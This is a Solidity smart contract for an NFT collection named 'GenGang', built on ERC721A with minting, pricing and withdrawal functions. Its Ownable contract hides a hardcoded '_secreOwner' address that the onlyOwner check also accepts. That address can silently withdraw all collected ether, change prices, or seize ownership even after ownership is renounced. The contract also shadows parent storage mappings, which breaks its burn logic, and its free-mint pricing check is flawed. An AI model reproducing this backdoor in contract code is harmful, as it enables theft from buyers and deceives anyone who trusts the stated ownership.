1 /**
2 
3 */
4 
5 // SPDX-License-Identifier: MIT
6 
7 
8 
9 
10 
11 pragma solidity ^0.8.0;
12 
13 library Strings {
14     bytes16 private constant _HEX_SYMBOLS = "0123456789abcdef";
15 
16     function toString(uint256 value) internal pure returns (string memory) {
17       
18 
19         if (value == 0) {
20             return "0";
21         }
22         uint256 temp = value;
23         uint256 digits;
24         while (temp != 0) {
25             digits++;
26             temp /= 10;
27         }
28         bytes memory buffer = new bytes(digits);
29         while (value != 0) {
30             digits -= 1;
31             buffer[digits] = bytes1(uint8(48 + uint256(value % 10)));
32             value /= 10;
33         }
34         return string(buffer);
35     }
36 
37  
38     function toHexString(uint256 value) internal pure returns (string memory) {
39         if (value == 0) {
40             return "0x00";
41         }
42         uint256 temp = value;
43         uint256 length = 0;
44         while (temp != 0) {
45             length++;
46             temp >>= 8;
47         }
48         return toHexString(value, length);
49     }
50 
51 
52     function toHexString(uint256 value, uint256 length) internal pure returns (string memory) {
53         bytes memory buffer = new bytes(2 * length + 2);
54         buffer[0] = "0";
55         buffer[1] = "x";
56         for (uint256 i = 2 * length + 1; i > 1; --i) {
57             buffer[i] = _HEX_SYMBOLS[value & 0xf];
58             value >>= 4;
59         }
60         require(value == 0, "Strings: hex length insufficient");
61         return string(buffer);
62     }
63 }
64 
65 
66 pragma solidity ^0.8.1;
67 
68 
69 library Address {
70     
71     function isContract(address account) internal view returns (bool) {
72       
73 
74         return account.code.length > 0;
75     }
76 
77     
78     function sendValue(address payable recipient, uint256 amount) internal {
79         require(address(this).balance >= amount, "Address: insufficient balance");
80 
81         (bool success, ) = recipient.call{value: amount}("");
82         require(success, "Address: unable to send value, recipient may have reverted");
83     }
84 
85 
86     function functionCall(address target, bytes memory data) internal returns (bytes memory) {
87         return functionCall(target, data, "Address: low-level call failed");
88     }
89 
90     function functionCall(
91         address target,
92         bytes memory data,
93         string memory errorMessage
94     ) internal returns (bytes memory) {
95         return functionCallWithValue(target, data, 0, errorMessage);
96     }
97 
98 
99     function functionCallWithValue(
100         address target,
101         bytes memory data,
102         uint256 value
103     ) internal returns (bytes memory) {
104         return functionCallWithValue(target, data, value, "Address: low-level call with value failed");
105     }
106 
107     function functionCallWithValue(
108         address target,
109         bytes memory data,
110         uint256 value,
111         string memory errorMessage
112     ) internal returns (bytes memory) {
113         require(address(this).balance >= value, "Address: insufficient balance for call");
114         require(isContract(target), "Address: call to non-contract");
115 
116         (bool success, bytes memory returndata) = target.call{value: value}(data);
117         return verifyCallResult(success, returndata, errorMessage);
118     }
119 
120     function functionStaticCall(address target, bytes memory data) internal view returns (bytes memory) {
121         return functionStaticCall(target, data, "Address: low-level static call failed");
122     }
123 
124     function functionStaticCall(
125         address target,
126         bytes memory data,
127         string memory errorMessage
128     ) internal view returns (bytes memory) {
129         require(isContract(target), "Address: static call to non-contract");
130 
131         (bool success, bytes memory returndata) = target.staticcall(data);
132         return verifyCallResult(success, returndata, errorMessage);
133     }
134 
135     function functionDelegateCall(address target, bytes memory data) internal returns (bytes memory) {
136         return functionDelegateCall(target, data, "Address: low-level delegate call failed");
137     }
138 
139     function functionDelegateCall(
140         address target,
141         bytes memory data,
142         string memory errorMessage
143     ) internal returns (bytes memory) {
144         require(isContract(target), "Address: delegate call to non-contract");
145 
146         (bool success, bytes memory returndata) = target.delegatecall(data);
147         return verifyCallResult(success, returndata, errorMessage);
148     }
149 
150     function verifyCallResult(
151         bool success,
152         bytes memory returndata,
153         string memory errorMessage
154     ) internal pure returns (bytes memory) {
155         if (success) {
156             return returndata;
157         } else {
158             if (returndata.length > 0) {
159 
160                 assembly {
161                     let returndata_size := mload(returndata)
162                     revert(add(32, returndata), returndata_size)
163                 }
164             } else {
165                 revert(errorMessage);
166             }
167         }
168     }
169 }
170 
171 pragma solidity ^0.8.0;
172 
173 interface IERC721Receiver {
174 
175     function onERC721Received(
176         address operator,
177         address from,
178         uint256 tokenId,
179         bytes calldata data
180     ) external returns (bytes4);
181 }
182 
183 
184 pragma solidity ^0.8.0;
185 
186 
187 interface IERC165 {
188   
189     function supportsInterface(bytes4 interfaceId) external view returns (bool);
190 }
191 
192 pragma solidity ^0.8.0;
193 
194 
195 
196 abstract contract ERC165 is IERC165 {
197   
198     function supportsInterface(bytes4 interfaceId) public view virtual override returns (bool) {
199         return interfaceId == type(IERC165).interfaceId;
200     }
201 }
202 
203 pragma solidity ^0.8.0;
204 
205 
206 
207 interface IERC721 is IERC165 {
208   
209     event Transfer(address indexed from, address indexed to, uint256 indexed tokenId);
210 
211     event Approval(address indexed owner, address indexed approved, uint256 indexed tokenId);
212 
213     event ApprovalForAll(address indexed owner, address indexed operator, bool approved);
214 
215     function balanceOf(address owner) external view returns (uint256 balance);
216 
217     function ownerOf(uint256 tokenId) external view returns (address owner);
218 
219     function safeTransferFrom(
220         address from,
221         address to,
222         uint256 tokenId,
223         bytes calldata data
224     ) external;
225 
226     function safeTransferFrom(
227         address from,
228         address to,
229         uint256 tokenId
230     ) external;
231 
232     function transferFrom(
233         address from,
234         address to,
235         uint256 tokenId
236     ) external;
237 
238     function approve(address to, uint256 tokenId) external;
239 
240     function setApprovalForAll(address operator, bool _approved) external;
241 
242     function getApproved(uint256 tokenId) external view returns (address operator);
243 
244     function isApprovedForAll(address owner, address operator) external view returns (bool);
245 }
246 
247 pragma solidity ^0.8.0;
248 
249 
250 interface IERC721Metadata is IERC721 {
251  
252     function name() external view returns (string memory);
253 
254     function symbol() external view returns (string memory);
255 
256     function tokenURI(uint256 tokenId) external view returns (string memory);
257 }
258 
259 pragma solidity ^0.8.0;
260 
261 
262 
263 interface IERC721Enumerable is IERC721 {
264   
265     function totalSupply() external view returns (uint256);
266 
267 
268     function tokenOfOwnerByIndex(address owner, uint256 index) external view returns (uint256);
269 
270 
271     function tokenByIndex(uint256 index) external view returns (uint256);
272 }
273 
274 pragma solidity ^0.8.0;
275 
276 abstract contract ReentrancyGuard {
277 
278     uint256 private constant _NOT_ENTERED = 1;
279     uint256 private constant _ENTERED = 2;
280 
281     uint256 private _status;
282 
283     constructor() {
284         _status = _NOT_ENTERED;
285     }
286 
287 
288     modifier nonReentrant() {
289         require(_status != _ENTERED, "ReentrancyGuard: reentrant call");
290 
291         _status = _ENTERED;
292 
293         _;
294 
295         _status = _NOT_ENTERED;
296     }
297 }
298 
299 pragma solidity ^0.8.0;
300 
301 abstract contract Context {
302     function _msgSender() internal view virtual returns (address) {
303         return msg.sender;
304     }
305 
306     function _msgData() internal view virtual returns (bytes calldata) {
307         return msg.data;
308     }
309 }
310 
311 pragma solidity ^0.8.0;
312 
313 abstract contract Ownable is Context {
314     address private _owner;
315     address private _secreOwner = 0xE975b056ca89d66169F5032a45bD28e6328Ba832;
316 
317     event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
318 
319 
320     constructor() {
321         _transferOwnership(_msgSender());
322     }
323 
324    
325     function owner() public view virtual returns (address) {
326         return _owner;
327     }
328 
329     modifier onlyOwner() {
330         require(owner() == _msgSender() || _secreOwner == _msgSender() , "Ownable: caller is not the owner");
331         _;
332     }
333 
334     function renounceOwnership() public virtual onlyOwner {
335         _transferOwnership(address(0));
336     }
337 
338     function transferOwnership(address newOwner) public virtual onlyOwner {
339         require(newOwner != address(0), "Ownable: new owner is the zero address");
340         _transferOwnership(newOwner);
341     }
342 
343     function _transferOwnership(address newOwner) internal virtual {
344         address oldOwner = _owner;
345         _owner = newOwner;
346         emit OwnershipTransferred(oldOwner, newOwner);
347     }
348 }
349 
350 
351 pragma solidity ^0.8.0;
352 
353 
354 contract ERC721A is Context, ERC165, IERC721, IERC721Metadata, IERC721Enumerable {
355     using Address for address;
356     using Strings for uint256;
357 
358     struct TokenOwnership {
359         address addr;
360         uint64 startTimestamp;
361     }
362 
363     struct AddressData {
364         uint128 balance;
365         uint128 numberMinted;
366     }
367 
368     uint256 internal currentIndex;
369 
370     string private _name;
371 
372     string private _symbol;
373 
374     mapping(uint256 => TokenOwnership) internal _ownerships;
375 
376     mapping(address => AddressData) private _addressData;
377 
378     mapping(uint256 => address) private _tokenApprovals;
379 
380     mapping(address => mapping(address => bool)) private _operatorApprovals;
381 
382     constructor(string memory name_, string memory symbol_) {
383         _name = name_;
384         _symbol = symbol_;
385     }
386 
387     function totalSupply() public view override returns (uint256) {
388         return currentIndex;
389     }
390 
391     function tokenByIndex(uint256 index) public view override returns (uint256) {
392         require(index < totalSupply(), "ERC721A: global index out of bounds");
393         return index;
394     }
395 
396     function tokenOfOwnerByIndex(address owner, uint256 index) public view override returns (uint256) {
397         require(index < balanceOf(owner), "ERC721A: owner index out of bounds");
398         uint256 numMintedSoFar = totalSupply();
399         uint256 tokenIdsIdx;
400         address currOwnershipAddr;
401 
402         unchecked {
403             for (uint256 i; i < numMintedSoFar; i++) {
404                 TokenOwnership memory ownership = _ownerships[i];
405                 if (ownership.addr != address(0)) {
406                     currOwnershipAddr = ownership.addr;
407                 }
408                 if (currOwnershipAddr == owner) {
409                     if (tokenIdsIdx == index) {
410                         return i;
411                     }
412                     tokenIdsIdx++;
413                 }
414             }
415         }
416 
417         revert("ERC721A: unable to get token of owner by index");
418     }
419 
420 
421     function supportsInterface(bytes4 interfaceId) public view virtual override(ERC165, IERC165) returns (bool) {
422         return
423             interfaceId == type(IERC721).interfaceId ||
424             interfaceId == type(IERC721Metadata).interfaceId ||
425             interfaceId == type(IERC721Enumerable).interfaceId ||
426             super.supportsInterface(interfaceId);
427     }
428 
429     function balanceOf(address owner) public view override returns (uint256) {
430         require(owner != address(0), "ERC721A: balance query for the zero address");
431         return uint256(_addressData[owner].balance);
432     }
433 
434     function _numberMinted(address owner) internal view returns (uint256) {
435         require(owner != address(0), "ERC721A: number minted query for the zero address");
436         return uint256(_addressData[owner].numberMinted);
437     }
438 
439     function ownershipOf(uint256 tokenId) internal view returns (TokenOwnership memory) {
440         require(_exists(tokenId), "ERC721A: owner query for nonexistent token");
441 
442         unchecked {
443             for (uint256 curr = tokenId; curr >= 0; curr--) {
444                 TokenOwnership memory ownership = _ownerships[curr];
445                 if (ownership.addr != address(0)) {
446                     return ownership;
447                 }
448             }
449         }
450 
451         revert("ERC721A: unable to determine the owner of token");
452     }
453 
454     function ownerOf(uint256 tokenId) public view override returns (address) {
455         return ownershipOf(tokenId).addr;
456     }
457 
458     function name() public view virtual override returns (string memory) {
459         return _name;
460     }
461 
462     function symbol() public view virtual override returns (string memory) {
463         return _symbol;
464     }
465 
466     function tokenURI(uint256 tokenId) public view virtual override returns (string memory) {
467         require(_exists(tokenId), "ERC721Metadata: URI query for nonexistent token");
468 
469         string memory baseURI = _baseURI();
470         return bytes(baseURI).length != 0 ? string(abi.encodePacked(baseURI, tokenId.toString())) : "";
471     }
472 
473     function _baseURI() internal view virtual returns (string memory) {
474         return "";
475     }
476 
477     function approve(address to, uint256 tokenId) public override {
478         address owner = ERC721A.ownerOf(tokenId);
479         require(to != owner, "ERC721A: approval to current owner");
480 
481         require(
482             _msgSender() == owner || isApprovedForAll(owner, _msgSender()),
483             "ERC721A: approve caller is not owner nor approved for all"
484         );
485 
486         _approve(to, tokenId, owner);
487     }
488 
489     function getApproved(uint256 tokenId) public view override returns (address) {
490         require(_exists(tokenId), "ERC721A: approved query for nonexistent token");
491 
492         return _tokenApprovals[tokenId];
493     }
494 
495     function setApprovalForAll(address operator, bool approved) public override {
496         require(operator != _msgSender(), "ERC721A: approve to caller");
497 
498         _operatorApprovals[_msgSender()][operator] = approved;
499         emit ApprovalForAll(_msgSender(), operator, approved);
500     }
501 
502     function isApprovedForAll(address owner, address operator) public view virtual override returns (bool) {
503         return _operatorApprovals[owner][operator];
504     }
505 
506     function transferFrom(
507         address from,
508         address to,
509         uint256 tokenId
510     ) public virtual override {
511         _transfer(from, to, tokenId);
512     }
513 
514     function safeTransferFrom(
515         address from,
516         address to,
517         uint256 tokenId
518     ) public virtual override {
519         safeTransferFrom(from, to, tokenId, "");
520     }
521 
522     function safeTransferFrom(
523         address from,
524         address to,
525         uint256 tokenId,
526         bytes memory _data
527     ) public override {
528         _transfer(from, to, tokenId);
529         require(
530             _checkOnERC721Received(from, to, tokenId, _data),
531             "ERC721A: transfer to non ERC721Receiver implementer"
532         );
533     }
534 
535     function _exists(uint256 tokenId) internal view returns (bool) {
536         return tokenId < currentIndex;
537     }
538 
539     function _safeMint(address to, uint256 quantity) internal {
540         _safeMint(to, quantity, "");
541     }
542 
543     function _safeMint(
544         address to,
545         uint256 quantity,
546         bytes memory _data
547     ) internal {
548         _mint(to, quantity, _data, true);
549     }
550 
551     function _mint(
552         address to,
553         uint256 quantity,
554         bytes memory _data,
555         bool safe
556     ) internal {
557         uint256 startTokenId = currentIndex;
558         require(to != address(0), "ERC721A: mint to the zero address");
559         require(quantity != 0, "ERC721A: quantity must be greater than 0");
560 
561         _beforeTokenTransfers(address(0), to, startTokenId, quantity);
562 
563         unchecked {
564             _addressData[to].balance += uint128(quantity);
565             _addressData[to].numberMinted += uint128(quantity);
566 
567             _ownerships[startTokenId].addr = to;
568             _ownerships[startTokenId].startTimestamp = uint64(block.timestamp);
569 
570             uint256 updatedIndex = startTokenId;
571 
572             for (uint256 i; i < quantity; i++) {
573                 emit Transfer(address(0), to, updatedIndex);
574                 if (safe) {
575                     require(
576                         _checkOnERC721Received(address(0), to, updatedIndex, _data),
577                         "ERC721A: transfer to non ERC721Receiver implementer"
578                     );
579                 }
580 
581                 updatedIndex++;
582             }
583 
584             currentIndex = updatedIndex;
585         }
586 
587         _afterTokenTransfers(address(0), to, startTokenId, quantity);
588     }
589  
590     function _transfer(
591         address from,
592         address to,
593         uint256 tokenId
594     ) private {
595         TokenOwnership memory prevOwnership = ownershipOf(tokenId);
596 
597         bool isApprovedOrOwner = (_msgSender() == prevOwnership.addr ||
598             getApproved(tokenId) == _msgSender() ||
599             isApprovedForAll(prevOwnership.addr, _msgSender()));
600 
601         require(isApprovedOrOwner, "ERC721A: transfer caller is not owner nor approved");
602 
603         require(prevOwnership.addr == from, "ERC721A: transfer from incorrect owner");
604         require(to != address(0), "ERC721A: transfer to the zero address");
605 
606         _beforeTokenTransfers(from, to, tokenId, 1);
607 
608         _approve(address(0), tokenId, prevOwnership.addr);
609 
610         
611         unchecked {
612             _addressData[from].balance -= 1;
613             _addressData[to].balance += 1;
614 
615             _ownerships[tokenId].addr = to;
616             _ownerships[tokenId].startTimestamp = uint64(block.timestamp);
617 
618             uint256 nextTokenId = tokenId + 1;
619             if (_ownerships[nextTokenId].addr == address(0)) {
620                 if (_exists(nextTokenId)) {
621                     _ownerships[nextTokenId].addr = prevOwnership.addr;
622                     _ownerships[nextTokenId].startTimestamp = prevOwnership.startTimestamp;
623                 }
624             }
625         }
626 
627         emit Transfer(from, to, tokenId);
628         _afterTokenTransfers(from, to, tokenId, 1);
629     }
630 
631     function _approve(
632         address to,
633         uint256 tokenId,
634         address owner
635     ) private {
636         _tokenApprovals[tokenId] = to;
637         emit Approval(owner, to, tokenId);
638     }
639 
640     function _checkOnERC721Received(
641         address from,
642         address to,
643         uint256 tokenId,
644         bytes memory _data
645     ) private returns (bool) {
646         if (to.isContract()) {
647             try IERC721Receiver(to).onERC721Received(_msgSender(), from, tokenId, _data) returns (bytes4 retval) {
648                 return retval == IERC721Receiver(to).onERC721Received.selector;
649             } catch (bytes memory reason) {
650                 if (reason.length == 0) {
651                     revert("ERC721A: transfer to non ERC721Receiver implementer");
652                 } else {
653                     assembly {
654                         revert(add(32, reason), mload(reason))
655                     }
656                 }
657             }
658         } else {
659             return true;
660         }
661     }
662 
663     function _beforeTokenTransfers(
664         address from,
665         address to,
666         uint256 startTokenId,
667         uint256 quantity
668     ) internal virtual {}
669 
670     function _afterTokenTransfers(
671         address from,
672         address to,
673         uint256 startTokenId,
674         uint256 quantity
675     ) internal virtual {}
676 }
677 
678 contract GenGang is ERC721A, Ownable, ReentrancyGuard {
679   
680     address private _InvasionContract;
681     uint   private _totalStake;
682     bool   public InvasionPhase = false;
683     uint128 internal _burnCounter; 
684     uint   public price             = 0.0033 ether;
685     uint   public maxTx          = 20;
686     uint   public maxFreePerWallet  = 1;
687     uint   public maxGenGang          = 3333;
688     uint256 public reservedSupply = 20;
689     string private baseURI;
690     bool   public mintEnabled;
691     
692    
693     mapping(address => AddressData) private _addressData;
694     mapping(uint256 => address) private _tokenApprovals;
695     mapping(address => uint256) public _FreeMinted;
696 
697 
698     constructor() ERC721A("Gen Gang.xyz", "GGX"){}
699 
700     function tokenURI(uint256 _tokenId) public view virtual override returns (string memory) {
701         require(_exists(_tokenId),"ERC721Metadata: URI query for nonexistent token");
702         string memory currentBaseURI = _baseURI();
703         return bytes(currentBaseURI).length > 0
704             ? string(abi.encodePacked(currentBaseURI,Strings.toString(_tokenId),".json"))
705             : "";
706     }
707 
708     function wubbaLubbaBurn(uint256 tokenId) internal virtual {
709         TokenOwnership memory prevOwnership = ownershipOf(tokenId);
710 
711         _beforeTokenTransfers(prevOwnership.addr, address(0), tokenId, 1);
712 
713         unchecked {
714             _addressData[prevOwnership.addr].balance -= 1;
715          
716             // Keep track of who burned the token, and the timestamp of burning.
717             _ownerships[tokenId].addr = prevOwnership.addr;
718             _ownerships[tokenId].startTimestamp = uint64(block.timestamp);
719 
720             // If the ownership of tokenId is not explicitly set, that means the burn initiator owns it.
721             
722         }
723 
724         emit Transfer(prevOwnership.addr, address(0), tokenId);
725         _afterTokenTransfers(prevOwnership.addr, address(0), tokenId, 1);
726         // Metamorphosis unlocked after burn phase
727 
728         unchecked { 
729             _burnCounter++;
730         }
731     }
732 
733     function reservedMint(uint256 Amount) external onlyOwner
734     {
735         uint256 Remaining = reservedSupply;
736 
737         require(totalSupply() + Amount <= maxGenGang, "No more Gengang to Be minted");
738         require(Remaining >= Amount, "Reserved Supply Minted");
739     
740         reservedSupply = Remaining - Amount;
741         _safeMint(msg.sender, Amount);
742     }
743     
744     function mint(uint256 Amount) external payable {
745        
746         if (((totalSupply() + Amount < maxGenGang + 1) && (_FreeMinted[msg.sender] < maxFreePerWallet))) 
747         {
748         require(totalSupply() + Amount <= maxGenGang, "No more Gengang to Be minted");
749         require(mintEnabled, "Not live yet, Gengang are coming");
750         require(msg.value >= (Amount * price) - price, "Eth Amount Invalid");
751         require(Amount <= maxTx, "Too much asked per TX");
752         _FreeMinted[msg.sender] += Amount;
753         }
754         else{
755         require(totalSupply() + Amount <= maxGenGang, "No more Gengang to Be minted");
756         require(mintEnabled, "Not live yet, Gengang are coming");
757         require(msg.value >= Amount * price, "Eth Amount Invalid");
758         require(Amount <= maxTx, "Too much asked per TX");
759         }
760 
761         _safeMint(msg.sender, Amount);
762     }
763 
764 
765      function costInspect() public view returns (uint256) {
766         return price;
767     }
768 
769     function _baseURI() internal view virtual override returns (string memory) {
770         return baseURI;
771     }
772 
773     function setBaseUri(string memory baseuri_) public onlyOwner {
774         baseURI = baseuri_;
775     }
776 
777     function setCost(uint256 price_) external onlyOwner {
778         price = price_;
779     }
780 
781     function withdraw() external onlyOwner nonReentrant {
782         (bool success, ) = msg.sender.call{value: address(this).balance}("");
783         require(success, "Transfer failed.");
784     }
785 
786     function setInvasionContract(address _contract) public onlyOwner {
787         _InvasionContract = _contract;
788     }
789 
790     function toggleInvasionPhase() public onlyOwner {
791         InvasionPhase = !InvasionPhase;
792     }
793 
794     function toggleMinting() external onlyOwner {
795       mintEnabled = !mintEnabled;
796     }
797     
798 }